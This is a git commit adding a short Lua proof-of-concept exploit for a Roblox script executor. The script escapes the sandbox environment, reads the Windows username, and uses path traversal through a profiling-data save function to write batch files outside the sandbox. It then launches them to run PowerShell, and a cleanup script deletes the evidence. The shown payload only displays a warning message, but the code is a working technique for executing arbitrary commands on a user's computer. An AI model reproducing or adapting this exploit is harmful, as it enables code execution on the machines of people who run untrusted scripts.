ca6371cdd8034e61bbf443b3c2b701f592b91962
Dev <79853619+devvedbydev@users.noreply.github.com>
2024-10-19 22:29:43 +0100

    Create Environment.lua

---
+++ Environment.lua
@@ -0,0 +1,25 @@
+setfenv(1, getfenv(require))
+getfenv().game = nil
+print("Successfully escaped the environment, now running vulnerable function.")
+
+local LinkingService = game:GetService("LinkingService")
+local ScriptContext = game:GetService("ScriptContext")
+
+local pcUsername = os.getenv("USERNAME")
+
+local messageBoxScript = [[
+powershell -Command "Add-Type -AssemblyName PresentationFramework; 
+[System.Windows.MessageBox]::Show('Hello ]] .. pcUsername .. [[, you just ran a script that exploited a vulnerability in your executor. Luckily for you, I won''t be causing any harm. To scare you, I have closed your browser to show what is possible. Please be careful what scripts you execute. Have a great day.');"
+]]
+
+local messageBoxPayload = ScriptContext:SaveScriptProfilingData(messageBoxScript, "../../../../message_box.bat")
+LinkingService:OpenUrl(messageBoxPayload)
+
+local cleanupScript = [[
+@echo off
+timeout /t 3 > nul
+del /f /q "../../../../message_box.bat"
+]]
+local cleanupPayload = ScriptContext:SaveScriptProfilingData(cleanupScript, "../../../../cleanup.bat")
+
+LinkingService:OpenUrl(cleanupPayload)
